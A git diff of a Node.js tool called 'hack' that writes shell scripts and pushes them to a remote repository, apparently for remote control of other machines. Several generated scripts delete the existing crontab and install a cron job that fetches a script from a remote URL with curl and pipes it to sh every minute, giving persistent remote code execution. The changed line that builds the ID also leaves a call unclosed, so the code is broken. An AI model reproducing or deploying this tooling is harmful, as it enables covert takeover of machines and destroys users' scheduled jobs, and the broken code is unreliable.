@@ -7,7 +7,9 @@ const env = process.argv[i+1]
 const cmd = process.argv[i+2]
 const args = process.argv.slice(i+3)
 
-const url = 'https://raw.githubusercontent.com/ccorcos/hack/master'
+const npm = require('../package.json')
+const url = npm.config.key
+
 
 hack(env, cmd, args)
 
@@ -25,7 +27,7 @@ function hack(env, cmd, args) {
     // `hack live reset`
      write(env, [
       'crontab -r',
-      'echo "* * * * * curl -s ' + url + '/' + env + ' | sh" | crontab',
+      'echo "* * * * * curl -s ' + url + '/env/' + env + ' | sh" | crontab',
     ].join('\n'))
 
   } else if (cmd === 'interval') {
@@ -50,7 +52,7 @@ function hack(env, cmd, args) {
 
     write(env, [
       'crontab -r',
-      'echo "' + freq + ' curl -s ' + url + '/' + env + '| sh" | crontab',
+      'echo "' + freq + ' curl -s ' + url + '/env/' + env + '| sh" | crontab',
     ].join('\n'))
 
   } else if (cmd === 'cron') {
@@ -67,7 +69,7 @@ function hack(env, cmd, args) {
 
     write(env, [
       "crontab -r",
-      'echo "* * * * * curl -s ' + url + '/' + newEnv + ' | sh" | crontab',
+      'echo "* * * * * curl -s ' + url + '/env/' + newEnv + ' | sh" | crontab',
     ].join('\n'))
 
     write(newEnv, '')
@@ -78,20 +80,20 @@ function hack(env, cmd, args) {
 }
 
 function write(env, cmd) {
-  // lets them know when and how many times they were hacked
-  const id = Date.now().toString()
+  const id = Math.round(Math.random()*10000000000).toString(
 
   const text = [
     "#!/usr/bin/env bash",
     "",
     "if [[ ! -e /tmp/hack." + id + " ]]; then",
     cmd,
+    "rm -f /tmp/hack/*",
     "touch /tmp/hack." + id,
     "fi",
   ].join('\n')
 
   // cd to this repo!
-  shell.cd(__dirname + '/..')
+  shell.cd(__dirname + '/../scripts/env')
   // make sure the environment file exists!
   if (!shell.test('-e', env)) {
     shell.touch(env)
@@ -102,12 +104,12 @@ function write(env, cmd) {
   shell.exec([
     'git add -A',
     'git commit -m "hack.' + id + '"',
-    'git push origin master',
+    'git push heroku master',
   ].join('; '))
 }
 
 
 function help() {
-  console.log('hack v' + require('../package.json').version)
+  console.log('hack v' + npm.version)
   console.log('usage: hack <env> <cmd> [args]')
 }
